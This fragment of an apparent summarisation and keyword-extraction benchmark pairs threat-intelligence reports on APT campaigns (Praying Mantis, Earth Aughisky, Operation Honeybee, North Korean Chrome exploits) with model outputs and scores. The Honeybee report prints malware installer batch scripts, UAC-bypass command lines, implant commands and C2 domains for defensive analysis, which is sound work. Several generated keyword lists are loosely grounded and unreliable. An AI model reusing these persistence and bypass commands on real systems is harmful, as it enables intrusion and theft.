possible or create different SQL users with proper minimal CRUD permissions.5. Block any unnecessary communications from IIS servers \u2013Your IIS servers should only generate traffic matching the set of known rules, limit and block these activities to the minimum possible.6. Configure a suitable application pool identity to run the web application \u2013Make sure your .NET web applications are running with a designated application pool identity with the lowest privileges possible. This would create an additional obstacle for TG1021.21Indicators of Compromise \u2022 Malicious HTTP Identifiers:o User agent hard-coded in the tools \u2013\u201cMozilla/5.0+(Windows+NT+10.0;+WOW64;+Trident/7.0;+rv:11.0)+like+Gecko\u201do HTTP parameter and cookie \u2013 \u201cAESKey\u201d o HTTP parameter \u2013 \u201c__VSTATEGENERATOR\u201d23MITRE ATT&CK Breakdown1. ReconnaissanceT1595.002 - Active Scanning: Vulnerability ScanningT1592 \u2013 Gather Victim Host InformationT1590 \u2013 Gather Victim Network Information2. Resource DevelopmentT1587.001 - Develop Capabilities: MalwareT1587.004 - Develop Capabilities: Exploits3. Initial AccessT1190 - Exploit Public-Facing Application4. ExecutionT1059.001 - Command and Scripting Interpreter: PowerShellT1059.007 - Command and Scripting Interpreter: JavaScript/JScript5. PersistenceT1505.003 \u2013 Web Shell6. Privilege EscalationT1055.001 - Process Injection: Dynamic-link Library InjectionT1055.001 - Process Injection: Dynamic-link Library InjectionT1068 \u2013 Exploitation for Privilege Escalation7. Defense EvasionT1036.005 - Masquerading: Match Legitimate Name or LocationT1036.005 - Masquerading: Match Legitimate Name or LocationT1140 - Deobfuscate/Decode Files or InformationT1070.004 - Indicator Removal on Host: File DeletionT1134.001 - Access Token Manipulation: Token Impersonation/TheftT1562.002 - Impair Defenses: Disable Windows Event LoggingT1078.002 \u2013 Domain AccountsT1027.002 \u2013 Software Packing8. Credential AccessT1056.003 - Input Capture: Web Portal Capture9. DiscoveryT1135 - Network Share DiscoveryT1083 - File and Directory Discovery2410. Lateral MovementT1550.004 - Use Alternate Authentication Material: Web Session CookieT1021.002 - Remote Services: SMB/Windows Admin SharesT1210 - Exploitation of Remote ServicesT1570 - Lateral Tool Transfer11. CollectionT1005 - Data from Local System12. Command and ControlT1071.001 - Application Layer Protocol: Web ProtocolsT1001 \u2013 Data ObfuscationT1090.001 \u2013 Internal ProxyT1132.001 - Data Encoding: Standard EncodingT1573.001 - Encrypted Channel: Symmetric CryptographyT1572 - Protocol TunnelingAbout Sygnia Sygnia is a cyber technology and services company, providing high-end consulting and incident response support for organizations worldwide. Sygnia works with companies to proactively build their cyber resilience and to respond and defeat attacks within their networks. It is the trusted advisor and cyber security service provider of IT and security teams, senior managements and boards of leading organizations worldwide, including Fortune 100 companies.For more information: www.sygnia.co94a Yigal Alon St., 29th floor, Tel Aviv, Israel, 6789155488 Madison Ave., 11th floor, New York, NY, USA, 1002252 Tras St., 2nd ", "generated_text": "Sygnia; TG1021; \"Praying Mantis; the attack; targets; Windows; internet-facing servers; deserialization attacks; web applications; techniques; procedures; Tremendous GET; stealthy backdoor; persistence; a backdoor; a suspicious backdoor; a backdoor; C2; network; ATT&CK; compromise; ATT&CK attacks; indicators; compromise; The activity; the threat actor; persistence; IP; IE; ATT&CK rules; Compromise; Targeting; moderately; the activity; IOCs; sample; the activity; business; the activity; IP address; the activity; the threat actor; documents.", "ref_text": "<START-1>The document analyzes an advanced cyber threat actor dubbed \"Praying Mantis\" by the cybersecurity company Sygnia. Praying Mantis conducted intrusion campaigns targeting prominent organizations by exploiting internet-facing servers, mainly using .NET deserialization attacks against Windows IIS servers. Praying Mantis utilized a custom, completely memory-resident malware toolkit tailored for IIS servers. The core implant NodeIISWeb intercepts all HTTP traffic and provides backdoor access. It can load additional modules, execute payloads, and forward traffic to other backdoors. A second stealthy backdoor ExtDLL.dll listens passively for commands. The toolkit includes loaders to inject the malware via exploits as well as web shells for control. Modules extend functionality for reconnaissance, credentials theft, lateral movement, privilege escalation and more. Praying Mantis was very focused on stealth, tampering with logging and actively removing tools after use. Tactics and tools correlate strongly with a threat actor tracked as \"Copy Paste\" by Australia's cyber security agency. Overlaps include deserialization exploits, JScript execution, obfuscation, and shared malware capabilities. The report provides indicators of compromise and recommendations for defending against such intrusions by securing internet-facing servers and .NET apps. Overall, the report profiles the sophisticated tradecraft and IIS malware platform of an advanced cyber threat actor that compromised multiple high-value targets through stealthy means. It provides insight into the actor's capabilities, while also informing potential victims. <END-1>", "t5/keyword/hint_hit_precision": 0.27906976744186046, "t5/word/hint_hit_recall": 0.07407407407407407, "gpt3/lexical/rouge_rouge1": 0.4721485411140583, "gpt3/lexical/rouge_rouge2": 0.15466666666666665, "gpt3/lexical/rouge_rougeL": 0.26525198938992045, "gpt3/lexical/rouge_rougeLsum": 0.26525198938992045, "gpt3_generated_text": ["The article discusses the findings of the Sygnia Incident Response team regarding an advanced and persistent threat actor known as TG1021, referred to as \"Praying Mantis\", targeting Windows internet-facing servers through deserialization attacks on web applications. The threat actor utilizes a custom malware platform, called NodeIISWeb, tailored for the Windows IIS environment. The malware is completely volatile, with a stealthy backdoor and post-exploitation privileges for lateral movement within networks. TG1021 shows expertise in OPSEC, actively avoiding detection by interfering with logging mechanisms and evading commercial EDRs. The threat actor's TTPs align with those of a state-sponsored actor described in an advisory by the Australian Cyber Security Centre. The article outlines the various exploits used by TG1021, the infrastructure of the malware platform, post-exploitation activities, and similarities to the Copy-Paste threat actor. Recommendations for defending against TG1021 attacks, sealing.NET deserialization exploits, and indicators of compromise are also provided."]}, {"split_name": "val", "sample_id": "val_29", "prompt_text": "Extract the keywords: www.trendmicro.com /en_us/research/22/j/tracking-earth-aughiskys-malware-and-changes.html Tracking Earth Aughisky\u2019s Malware and Changes \u22ee 10/4/2022For over 10 years, security researchers have been observing and keeping tabs of APT group Earth Aughisky\u2019s malware families and the connections, including previously documented malware that have yet to be attributed.By: CH Lei October 04, 2022 Read time: 3 min (872 words)For security researchers and analysts monitoring advanced persistent threat (APT) groups\u2019 attacks and tools, Earth Aughisky (also known as Taidoor) is among the more active units that consistently make security teams vigilant. Over the last decade, the group has continued to make adjustments in the tools and malware deployments on specific targets located in Taiwan and, more recently, Japan.Our research paper, \u201cThe Rise of Earth Aughisky: Tracking the Campaigns Taidoor Started,\u201d lists all the malware attributed to the group, the connections of these malware families and tools with other APT groups, and the latest updates in illicit activities potentially connected to real-world changes. Our research also covers recommendations and potential opportunities from the changes this APT group appears to be undergoing.Malware families attributedThis blog post summarizes and highlights some of the malware families and tools with components that have yet to be identified, reported, or attributed to the group. For a full list of all the malware families and tools we attribute to Earth Aughisky, download our research here.Roudan (also known as Taidoor)While the name Taidoor has been interchangeably used to refer to the group and the malware, we analyzed that the threat actors named this malware family Roudan while looking at both the backdoor and backdoor builder. This classic Earth Aughisky malware, which was first disclosed over 10 years ago, has been observed for the different formats the group employed for callback traffic as it contains an encoded MAC address and data.1/6Figure 1. Some of the builders taken from different samples of RoudanFigure 2. Roudan network traffic with encoded MAC addressesLuckDLLStill unreported, LuckDLL is a relatively new backdoor observed to be active after 2020. The public key is embedded inside the malware configuration and subsequently communicates with the C&C server. LuckDLL then proceeds to generate a random session key and initialization vector (IV) to encrypt the traffic.The public key encrypts the session key and IV during initial communication, and shared with the C&C.2/6Figure 3. Public key (top) and session key (bottom)GrubbyRATFollowing our sensors\u2019 observations, GrubbyRAT is deployed only when Earth Aughisky is interested in important targets that follow certain criteria. Still unreported, the configuration file is sometimes installed under an existing application or general system folder and uses the same file name as the component. This suggests that this RAT is installed manually and after the threat actor has gained administrative privileges and control in the infected system.Figure 4. Decrypted GrubbyRAT configurationTaikite (also known as SVCMONDR)While previously reported as SVCMONDR, this malware has yet to be attributed to Earth Aughisky. Previously identified with a 2015 report identifying a vulnerability, some samples of this dropped file observed in Taiwan had a .pdb similar to the APT group\u2019s other malware families and tools. The C&C callback traffic is encoded in Base64 and showed a detailed feedback data structure and behavior analysis.3/6Figure 5. The Taikite .pdb stringFigure 6. Taikite trafficSiyBotThis backdoor has yet to be reported, likely because we observed this tool as being deployed less and only in few attack incidences. SiyBot abuses earlier versions of public services such as Gubb and 30 Boxes to perform C&C communication, wherein the necessary credential or token can be found in the malware configuration. We observed this backdoor to support only a few functions based on the commands we found.Figure 7. Embedded 30 Boxes credential in the malwareConnectionsWe feature some of the overlaps and connections we found with Earth Aughisky\u2019s malware and tools.Roudan and SiyBotWe found the same website being used to host Roudan and SiyBot, as well as ASRWEC downloader (a tool we also attribute to Earth Aughisky) payload in the same repository.4/6Figure 8. Roudan (left) and SiyBot (right) payload in the same repositoryRoudan, Taleret, and TaikiteTaleret is another malware family that has been identified or suspected with Earth Aughisky for years. We found overlaps in the C&C servers being used by these malware families, as well as the same hashes, logging mechanisms, and blog hosts between Taleret and earlier versions of Roudan payload.Figure 9. Taleret\u2019s special log file (left) compared with Roudan\u2019s earlier version (right)Figure 10. Taleret configuration (left) and Comeon downloader payload (Roudan, right) on the same blogInsights5/6As Earth Aughisky is one of the few APT groups that has exercised longevity in cyberespionage, security analysts and teams have collected and continue to gather data to evaluate the group\u2019s skills, developments, relations with other APT groups, and their activities. Samples of their malware families and tools allow security teams to gain an understanding of the level of sophistication \u2013 or lack of it \u2013 of the group\u2019s operations, connection, and even changes possibly affecting them from the real-world complexities such as politics and geographic objectives.To find the complete details of our malware analyses, insights, and attribution connections, download our research paper, \u201cThe Rise of Earth Aughisky: Tracking the Campaigns Taidoor Started.\u201dIndicators of Compromise (IOCs)For a full list of the IOCs, find them here.6/6 ", "generated_text": "Trend Micro; analysis; Over 10 years; advanced persistent threat; APT; Taidoor; the group; the tools; tools; the tool; RAT; use; name; SVCMONDR; Taikite; RAT; MAC addresses; use; the malware; Spam; XOR; a custom; a backdoor; RAT; the same repository; ASRWEC; connections; Japanese; 2018; recommendations; potential opportunities; changes; the group; tools.", "ref_text": "<START-1>The PDF describes research by Trend Micro tracking the malware and changes of the advanced persistent threat (APT) group Earth Aughisky (also known as Taidoor). Earth Aughisky has been active for over 10 years targeting Taiwan and Japan. The research profiles malware families attributed to Earth Aughisky like Roudan/Taidoor, LuckDLL, GrubbyRAT, Taikite, and SiyBot. Some are newly revealed or attributed. The malware uses various techniques for command and control, encryption, and more. Connections between the malware families are outlined, such as overlap in infrastructure like domains and hosting. Similarities in logging, hashes, configuration, and other technical attributes link families like Roudan, Taleret, and Taikite. Earth Aughisky continually adjusts its malware and tactics. The research allows tracking of the group's skills, relations to other APTs, and real-world motivations. Their longevity makes them an important target for monitoring. In summary, the research provides in-depth analysis of multiple malware families attributed to Earth Aughisky over more than a decade, including revealing new families and connections between them. This aids threat intelligence efforts against this persistent cyberespionage group. <END-1>", "t5/keyword/hint_hit_precision": 0.38235294117647056, "t5/word/hint_hit_recall": 0.11494252873563218, "gpt3/lexical/rouge_rouge1": 0.5589225589225589, "gpt3/lexical/rouge_rouge2": 0.2305084745762712, "gpt3/lexical/rouge_rougeL": 0.3569023569023569, "gpt3/lexical/rouge_rougeLsum": 0.3569023569023569, "gpt3_generated_text": ["This article by Trend Micro provides an in-depth analysis of the activities of the advanced persistent threat group Earth Aughisky, also known as Taidoor, over the past decade. The group has been observed making adjustments to their malware tools and deployments, particularly targeting entities in Taiwan and Japan. The research paper highlights various malware families attributed to Earth Aughisky, such as Roudan, LuckDLL, GrubbyRAT, Taikite (SVCMONDR), and SiyBot. The article also discusses connections between these malware tools, including the use of the same repository for hosting Roudan, SiyBot, and ASRWEC downloader payloads. Overall, the analysis provides insights into the group's evolving tactics and potential opportunities for security teams to enhance their defenses against Earth Aughisky's threats."]}, {"split_name": "val", "sample_id": "val_30", "prompt_text": "Extract the keywords: (url\uf002\uf0e1\uf09a\uf099 \uf0d5 \uf09eMcAfee Uncovers Operation Honeybee, a Malicious Document Campaign Targeting Humanitarian Aid GroupsBy Ryan Sherstobito  (url /) on Mar 02, 2018 (url post was written with contributions from Jessica Saavedra-Morales, Thomas Roccia, and Asheer Malhotra.McAfee Advanced Threat Research analysts have discovered a new operation targeting humanitarian aid organizations and using North Korean political topics as bait to lure victims into opening malicious Microsoft Word documents. Our analysts have named this Operation Honeybee, based on the names of the malicious documents used in the attacks.Advanced Threat Research analysts have also discovered malicious documents authored by the same actor that indicate a tactical shift. These documents do not contain the typical lures by this actor, instead using Word compatibility messages to entice victims into opening them.The Advanced Threat Research team also observed a heavy concentration of the implant in Vietnam from January 15\u201317.BackgroundOn January 15, Advanced Threat Research discovered an operation using a new variant of the SYSCON backdoor. (url The Korean-language Word document manual.doc appeared in Vietnam on January 17, with the original author name of Honeybee.Document properties.This malicious document contains a Visual Basic macro that dropped and executed an upgraded version of the implant known as SYSCON, which appeared in 2017 in malicious Word documents as part of several campaigns using North Korea\u2013related topics. The malicious Visual Basic script uses a unique key (custom alphabet) to encode data. We have seen this in previous operations using SYSCON. This key was also used in the Honeybee campaign and appears to have been used since August 2017.Examples of decoy documents.Several additional documents surfaced between January 17 and February 3. All contain the same Visual Basic macro code and author name as Honeybee. Some of the malicious documents were test  les without the implant. From our analysis, most these documents were submitted from South Korea, indicating that some of the targeting was in South Korea. These Honeybee documents did not contain any speci c lures, rather variations of a \u201cnot compatible\u201d message attempting to convince the user to enable content.We also observed a related malicious document created January 12 by the author Windows User that contained a di erent encoding key, but essentially used the same macro and same type of implant as we saw with the recent Honeybee documents. This document, \u201cInternational Federation of Red Cross and Red Crescent Societies \u2013 DPRK Country O ce,\u201d drops an implant with the control server address 1113427185.ifastnet.org, which resolves to the same server used by the implants dropped in the Honeybee case.The directory contents of control server 1113427185.ifastnet.org.The directory contents of ftp.byethost11.com, from Honeybee samples.Log  les of compromised machines from February 2018 Honeybee samples.MaoCheng DropperAside from  nding the malicious documents, the Advanced Threat Research team discovered a Win32-based executable dropper. This dropper uses a stolen digital signature from Adobe Systems. This certi cate is also used by another Korean- program database (PDB) path.D:\\Task\\DDE Attack\\MaoCheng\\Release\\Dropper.pdbThe malware is a Win32 executable that pretends to be a Word document based on its icon. This is a dropper for the same type of malware as observed with the other Word documents. This sample also dropped a decoy document with the author name Honeybee. This sample, however, contained a bug that interfered with the execution  ow of the dropper, suggesting that the authors did not test the malware after code signing it.The decoy document uses the cloud-based accounting software company Xero as a lure:A decoy document from MaoCheng dropper.Possible OperatorThe Advanced Threat Research team has identi ed the following persona (snoopykiller@mail.ru) tied to this recent operation. Based on our analysis, the actor registered two free hosting accounts: navermail.byethost3.com, which refers to the popular South Korean search engine, and nihon.byethost11.com. The email address was used to register a free account for a control server in all the implants described in our analysis.Technical AnalysisLet\u2019s start with an overview of the attack:We continue with the components involved in this operation.The malicious Word  le is the beginning of the infection chain and acts as a dropper for two DLL  les. The Word  le contains malicious Visual Basic macro code that runs when the document is opened in Word using the Document_Open() autoload function. The word  le also contains a Base64-encoded  le (encoded with a custom key) in it that is read, decoded, and dropped to the disk by the macro.The Document_Open() subroutine implementing the malicious functionality.The Visual Basic macro performs the following tasks:Opens a handle to the malicious document to read the encoded CAB  le Decodes the CAB  le and writes it to the disk at %temp%\\setup.cabEncoded CAB  le in the Word document.Decoding and writing the CAB  le to %temp%.The decoded CAB  le in the Visual Basic memory bu er.The CAB  le contains the following  les and functions:dll: A malicious DLL used to launch batch  les (used with cliconfg.exe for UAC bypass). The DLL contains the following PDB path: D:\\Task\\MiMul\\NTWDBLIB\\Release\\NTWDBLIB.pdb. bat: A batch  le to set up the service COMSysApp, for an x64 system bat: A batch  le to set up the service COMSysApp, for an x86 system ini: A data  le with Base64-encoded data for connecting to an FTP server. Credentials are encoded in the .ini  le.Decoded credential data contained in ipnet.ini.dll: The malicious DLL  le run as a service (using svchost.exe). The DLL contains the following PDB path: D:\\Task\\MiMul\\FTPCom_vs10\\Release\\Engine.pdb. The macro then extracts the CAB  le into %systemroo%\\system32, using either wusa.exe or expand.exe (depending on the OS) to again bypass UAC prompts Once the  les have been extracted, the Visual Basic macro deletes the CAB  le and runs the malicious NTWDBLIB.dll via cliconfg.exe (to gain privileges and bypass UAC protections) Command lines used by the Visual Basic macro:cmd /c wusa %TEMP%\\setup.cab /quiet /extract:%SystemRoot%\\System32 && del /f /q %TEMP%\\setup.cab && cliconfg.exe cmd /c expand %TEMP%\\setup.cab -F:* %SystemRoot%\\System32 && del /f /q %TEMP%\\setup.cab && cliconfg.exe A combination of NTWDBLIB.dll and cliconfg.exe are used to bypass UAC protections; this is a familiar attack on Windows. UAC bypass via DLL hijacking requires:A Windows executable with the auto-elevate property in its manifest A Windows executable in a secure directory (%systemroot%\\system32)The malicious NTWDBLIB DLL performs the simple task of setting up the malicious ipnet.dll as a service by running one of the two batch  les contained in the CAB  le (which is also dropped to %systemroot%\\system32):NTWDBLIB executing the installer batch  les under the context of cliconfg.exe.The batch  les involved in the attack modify the system service COMSysApp to load the malicious ipnet.dll. The contents of the batch  les vary depending on the OS (x64 vs x86):install1.bat (x64)@echo o  sc stop COMSysApp sc con g COMSysApp type= own start= auto error= normal binpath= \"%windir%\\SysWOW64\\svchost.exe -k COMSysApp\" reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t REG_MULTI_SZ /d \"COMSysA reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%windir% sc start COMSysApp del /f /q %windir%\\SysWOW64\\install2.bat del /f /q %windir%\\SysWOW64\\install1.batinstall2.bat (x86)@echo o  sc stop COMSysApp sc con g COMSysApp type= own start= auto error= normal binpath= \"%windir%\\System32\\svchost.exe -k COMSysApp\" reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t REG_MULTI_SZ /d \"COMSysA reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%windir% sc start COMSysApp del /f /q %windir%\\System32\\install1.bat del /f /q %windir%\\System32\\install2.batThe batch  les perform these tasks:Stop the service COMSysApp Con gure the service to autostart (to set up persistence on the system) Modify registry keys to launch the DLL unser svchost.exe Specify the malicious DLL path to be loaded into the svchost process. Immediately restart the service Remove the batch  les to reduce the  ngerprint on the systemIPNet.dll runs as a service under svchost.exe.The malicious DLL is also responsible for terminating the cliconfg.exe process and deleting the malicious NTWDBLIB.dll Base64-decoding scheme with a di erent custom key. This document was created January 10.Contents of the decoy document.This variant also consists of two CAB  les that are dropped to %temp%, depending on the OS (x86 or x64).The key di erences in this variant:Two CAB  les are encoded into the Word document in text boxes instead of being appended in the DOC  le There is one CAB  le for an x86 system and another for an x64 system This malware sample uses uacme.exe with dummy.dll to implement the UAC bypassexe is the program vulnerable to the UAC bypass attack dll runs install.bat to set up the service (same as NTWDBLIB.dll)exe and dummy.dll may be either 64-bit or 32-bit binaries based on the OS. Ipnet.dll may also be either 64-bit or 32-bit. The Visual Basic macro uses the following command line:cmd /c expand %TEMP%\\setup.cab -F:* %TEMP% && cd /d %TEMP% && del /f /q setup.cab && uacme.exeThe control server credential information contained in the CAB  les is di erent:Decoded credential data contained in another ipnet.ini.Similarities between this variant and the original malware sample:Service name is the same: COMSysApp The DLL and ini  les contain the same functions as described elsewhere in this postData ReconnaissanceThe following information is gathered from the endpoint and sent to the control server.System info:Computer name System info using: cmd /c systeminfo >%temp%\\temp.ini List of currently running process using: cmd /c tasklist >%temp%\\temp.iniEx ltrationThe data ex ltration process runs in the following sequence: The temp.ini  les are copied into a text  le that matches the pattern:From <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt. For example, From <COMPUTER-NAME> (01- 04 11-40-02).txtAll the text  les are now packed into the archive temp.zip (%temp%\\temp.zip) zip is Base64 encoded (with a custom key, same as that used in the malicious document) and then copied to post.txt txt is uploaded to the control serverAdditional Commands and CapabilitiesThe service-based DLL implant traverses to the /htdocs/ directory on the FTP server and looks for any  les with the keywords:TO EVERYONE: Commands issued to all infected endpoints TO <COMPUTERNAME>: Commands issued to endpoints matching the ComputerNameThe following commands are supported by the malware implant:cmd /c pull < lename>: Adds  lename to temp.zip, Base64 encodes, and uploads to control server cmd /c chip <string>: Deletes current ipnet.ini con g  le. Writes new con g info (control server connection info) to new ipnet.ini. cmd /c put <new_ le_name> <existing_ le_name>: Copies existing  le to new  le name. Deletes existing  le. /user <parameters>: Executes downloaded  le with parameters speci ed using CreateProcessAsUser cmd /c <command>: Executes command on infected endpointConclusionThe actor behind Honeybee has been operating with new implants since at least November 2017 with the  rst known version of NTWDBLIB installer. Furthermore, based on the various metadata in both documents and executables, the actor is likely a Korean speaker.The techniques used in the malicious documents such as the lure messages closely resemble what we have observed before in South Korea. The attacker appears to target those involved in humanitarian aid and inter-Korean a airs. We have seen this operation expand beyond the borders of South Korea to target Vietnam, Singapore, Argentina, Japan, Indonesia, and Canada.Based on the McAfee Advanced Threat Research team\u2019s analysis, we  nd multiple components from this operation are unique from a code perspective, even though the code is loosely based on previous versions of the SYSCON backdoor. Some new droppers have not been observed before in the wild. The MaoCheng dropper was apparently created speci cally for this operation and appeared only twice in the wild.Indicators of compromiseMITRE ATT&CK techniquesModify existing service Deobfuscate/decode  les or information System information discovery Command-line Interface Data from local system Automated ex ltration Data encrypted Commonly used port ftp.byethost11.com 1113427185.ifastnet.org navermail.byethost3.com nihon.byethost3.com\uf104 Previous Article (url 2018-mobile-threats-report/)Next Article \uf105 (url ash-protection- mechanism/)\uf07c Categories: McAfee Labs (url \uf02c Tags: advanced persistent threats (url cybersecurity (url malware (url Phishing (url a replyFacebook Comments (0) Comments (0) G+ CommentsNewsletter Sign UpFirst Name *Last Name *Email Address *Country *--Please Select--SubmitMcAfee on Twitter \uf099 Follow us on Twitter (url (url is using a never-before-seen tactic to get ahold of #Bitcoin (url#search?q=Bitcoin) wallets. More on the campaign\u2014 #HaoBao (url#search?q=HaoBao). url (url hours ago (2018/03/03 08:00:05) Reply (url \u00b7 Retweet (url tweet_id=969844847157895169) \u00b7 Favorite (url (url Honeybee, a campaign leveraging a new variant of the #SYSCON (url#search? q=SYSCON) backdoor, is targeting humanitarian aid orga\u2026 url (url day ago (2018/03/02 23:30:06) Reply (url \u00b7 Retweet (url tweet_id=969716507621167104) \u00b7 Favorite (url (url always look to bypass new protection mechanisms. More on how #hackers (url#search?q=hackers) exploited an #Adobe (url#search?q=Adobe) Flash vulnerabi\u2026 url (url day ago (2018/03/02 20:05:34) Reply (url \u00b7 Retweet (url tweet_id=969665033314684929) \u00b7 Favorite (url Article(url ash-protection-mechanism/)McAfee Labs (url How Hackers Bypassed an Adobe Flash Protection MechanismAbout (url | Subscribe (/feed/) | Contact & Media Requests (url#ht=tab-publicrelations) | Privacy Policy (url | Legal (url \u00a9 2018 McAfee LLC\uf099\uf09a\uf0e1\uf167 \uf0d5(url (url (url (url ", "generated_text": "Operation Honeybee; humanitarian aid organizations; North Korean political topics; lures; victims; malicious Microsoft Word documents; The document; SYSCON; 2017; the implants; use; the macro; a custom alphabet; data; a decoy document; MaoCheng dropper; a stolen digital signature; Adobe Systems; a fake signature; a builder; the malware; a remote attacker; the attacker; a var; the command; control; servers; the infection; a control server; the targeted organizations.", "ref_text": "<START-1>The document describes an operation called Operation Honeybee that was discovered by McAfee researchers. The operation involved a malicious document campaign targeting humanitarian aid groups. The malicious documents contained North Korean political themes as lures to get victims to open the documents. Once opened, the documents installed a malware backdoor called SYSCON on the victim's computer. Researchers found that the campaign heavily targeted victims in Vietnam in mid-January 2018. Analysis showed the documents were authored by a Korean speaker. The malware used unique encoding keys that matched previous SYSCON campaigns dating back to August 2017. The malware established persistence on systems and exfiltrated data like system info and running processes back to a command server. The malware variants used new droppers not seen before, indicating the threat actors created new tools specific for this campaign. The malware bypassed Windows UAC protections in its installation process. In addition to Vietnam, researchers saw targeting in South Korea, Singapore, Argentina, Japan, Indonesia, and Canada. The campaign specifically went after those involved in humanitarian aid and North/South Korean affairs. The report provides IOCs like file hashes, domain names, and MITRE ATT&CK techniques used by the malware. It concludes that this was a unique operation using custom malware to target a specific set of victims related to Korea issues and aid groups. <END-1>", "t5/keyword/hint_hit_precision": 0.3, "t5/word/hint_hit_recall": 0.055299539170506916, "gpt3/lexical/rouge_rouge1": 0.35398230088495575, "gpt3/lexical/rouge_rouge2": 0.0771513353115727, "gpt3/lexical/rouge_rougeL": 0.20058997050147492, "gpt3/lexical/rouge_rougeLsum": 0.20058997050147492, "gpt3_generated_text": ["McAfee Advanced Threat Research analysts have uncovered Operation Honeybee, a malicious document campaign targeting humanitarian aid organizations by using North Korean political topics as bait. The operation involves the use of malicious Microsoft Word documents containing a Visual Basic macro that drops an upgraded version of the SYSCON backdoor implant. The documents do not contain typical lures but instead use Word compatibility messages to entice victims. Additionally, a Win32 executable dropper with a stolen digital signature from Adobe Systems has been discovered, suggesting a remote attacker's involvement. The attacker, identified as snoopykiller@mail.ru, registered control servers for the implants in the operation. This attack highlights the need for vigilance among targeted organizations to prevent further infiltration."]}, {"split_name": "val", "sample_id": "val_31", "prompt_text": "Extract the keywords: Countering threats from North Koreablog.google/threat-analysis-group/countering-threats-north-korea/Mar 24, 2022Adam WeidemannOn February 10, Threat Analysis Group discovered two distinct North Korean government-backed attacker groups exploiting a remote code execution vulnerability in Chrome, CVE-2022-0609. These groups' activity has been publicly tracked as Operation Dream Job and Operation AppleJeus.We observed the campaigns targeting U.S. based organizations spanning news media, IT, cryptocurrency and fintech industries. However, other organizations and countries may have been targeted. One of the campaigns has direct infrastructure overlap with a campaign targeting security researchers which we reported on last year. The exploit was patched on February 14, 2022. The earliest evidence we have of this exploit kit being actively deployed is January 4, 2022.We suspect that these groups work for the same entity with a shared supply chain, hence the use of the same exploit kit, but each operate with a different mission set and deploy different techniques. It is possible that other North Korean government-backed attackers have access to the same exploit kit.In this blog, we will walk through the observed tactics, techniques and procedures, share relevant IOCs and analyze the exploit kit used by the attackers. In line with our current disclosure policy, we are providing these details 30 days after the patch release.Campaign targeting news media and IT companiesThe campaign, consistent with Operation Dream Job, targeted over 250 individuals working for 10 different news media, domain registrars, web hosting providers and software vendors. The targets received emails claiming to come from recruiters at Disney, Google and Oracle with fake potential job opportunities. The emails contained links spoofing legitimate job hunting websites like Indeed and ZipRecruiter.1/4Example of spoofed job hunting websitesVictims who clicked on the links would be served a hidden iframe that would trigger the exploit kit.Attacker-Owned Fake Job Domains:disneycareers[.]net find-dreamjob[.]com ziprecruiters[.]orgExploitation URLs:https[:]//colasprint[.]com/about/about.asp (legitimate but compromised website) https[:]//varietyjob[.]com/sitemap/sitemap.aspCampaign targeting cryptocurrency and Fintech organizations Another North Korean group, whose activity has been publicly tracked as Operation AppleJeus, targeted over 85 users in cryptocurrency and fintech industries leveraging the same exploit kit. This included compromising at least two legitimate fintech company websites and hosting hidden iframes to serve the exploit kit to visitors. In other cases, we observed fake websites \u2014 already set up to distribute trojanized cryptocurrency applications \u2014 hosting iframes and pointing their visitors to the exploit kit.2/4Attacker-Owned Websites:blockchainnews[.]vip chainnews-star[.]com teenbeanjs[.]comCompromised Websites (Feb 7 - Feb 9):www.options-it[.]com www.tradingtechnologies[.]comExploitation URLs:https[:]//financialtimes365[.]com/user/finance.asp https[:]//gatexpiring[.]com/gate/index.asp https[:]//humingbot[.]io/cdn/js.asp https[:]//teenbeanjs[.]com/cloud/javascript.aspExploit kit overview The attackers made use of an exploit kit that contained multiple stages and components in order to exploit targeted users. The attackers placed links to the exploit kit within hidden iframes, which they embedded on both websites they owned as well as some3/4websites they compromised.The kit initially serves some heavily obfuscated javascript used to fingerprint the target system. This script collected all available client information such as the user-agent, resolution, etc. and then sent it back to the exploitation server. If a set of unknown requirements were met, the client would be served a Chrome RCE exploit and some additional javascript. If the RCE was successful, the javascript would request the next stage referenced within the script as \u201cSBX\u201d, a common acronym for Sandbox Escape. We unfortunately were unable to recover any of the stages that followed the initial RCE.Careful to protect their exploits, the attackers deployed multiple safeguards to make it difficult for security teams to recover any of the stages. These safeguards included:Only serving the iframe at specific times, presumably when they knew an intended target would be visiting the site. In some email campaigns the targets received links with unique IDs. This was potentially used to enforce a one-time-click policy for each link and allow the exploit kit to only be served once. The exploit kit would AES encrypt each stage, including the clients\u2019 responses with a session-specific key. Additional stages were not served if the previous stage failed.Although we recovered a Chrome RCE, we also found evidence where the attackers specifically checked for visitors using Safari on MacOS or Firefox (on any OS), and directed them to specific links on known exploitation servers. We did not recover any patched on February 14, which stresses the importance of applying security updates as they become available.4/4 ", "generated_text": "February 10; Threat Analysis Group; two distinct North Korean government-backed attacker groups; a remote code execution vulnerability; Chrome; CVE-2022-0609; Operation Dream Job; Operation AppleJeus; organizations; news media; technology; cryptocurrency; fintech; the campaigns; links; the exploit kit; a Chrome RCE exploit; components; the exploit kit; RCE; Sandbox Escape; the attackers; a shared supply chain; the exploit kit; the same entity; January; 4; 2022; the exploit kit; infrastructure; time; customers; the same group; different mission sets; other North Korean government-backed attackers; the same exploit kit.", "ref_text": "<START-1>1. Initial Access - Threat actors send phishing emails with malicious links pretending to be job recruitment messages. 2. Weaponization - The links lead to attacker-controlled sites or compromised legitimate sites hosting hidden iframes that load the exploit kit. 3. Delivery - When targets click the links and visit the sites, the iframes silently trigger the exploit kit in the background. 4. Exploitation - The exploit kit fingerprints the target's browser and OS first. - It then delivers the Chrome exploit (CVE-2022-0609) if the target is on Chrome. - Other exploits may be served if the target is on Safari or Firefox. 5. Installation - If the Chrome exploit is successful, additional JavaScript is loaded to execute the next stage - likely a sandbox escape. 6. Command & Control - The later stages of the exploit kit likely establish command and control to the attacker's infrastructure. 7. Actions on Objectives - The attackers leverage the remote access and persistence gained for espionage and data exfiltration. <END-1>", "t5/keyword/hint_hit_precision": 0.19444444444444445, "t5/word/hint_hit_recall": 0.06666666666666667, "gpt3/lexical/rouge_rouge1": 0.392282958199357, 